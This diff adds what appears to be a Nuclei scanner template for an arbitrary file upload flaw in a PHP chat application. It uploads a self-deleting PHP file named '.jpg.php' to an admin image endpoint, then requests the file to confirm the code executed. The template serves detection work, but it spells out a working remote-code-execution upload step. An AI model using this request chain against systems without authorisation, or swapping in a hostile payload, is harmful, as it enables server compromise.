@@ -1,0 +1,72 @@
+id: chatlive-uploadimg-html-writefile
+info:
+  name: PHP Chat Live Upload Image HTML Write File
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A vulnerability in the uploadimg.html functionality of a PHP chat live application allows arbitrary file upload, leading to potential remote code execution. This template tests for the file upload and execution by uploading a PHP file and verifying its execution.
+  reference:
+    - https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA
+
+variables:
+  f1: '{{rand_int(40000, 44800)}}'
+  rboundary: '{{rand_text_alphanumeric(8)}}'
+  randname: '{{rand_text_alphanumeric(6)}}'
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: check-uploadimg-page
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/event/uploadimg.html"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "editormd-image-file"
+
+  - id: upload-malicious-file
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/event/uploadimg.html"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="editormd-image-file"; filename="{{randname}}.jpg.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo md5({{f1}});unlink(__FILE__);?>\r\n------WebKitFormBoundary{{rboundary}}--\r\n
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\.php"
+    extractors:
+      - type: regex
+        name: dir
+        group: 1
+        regex:
+          - '"url":"(?P<dir>.+?)"'
+        internal: true
+
+  - id: verify-file-execution
+    method: GET
+    path:
+      - "{{BaseURL}}/{{dir}}"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(f1)}}"
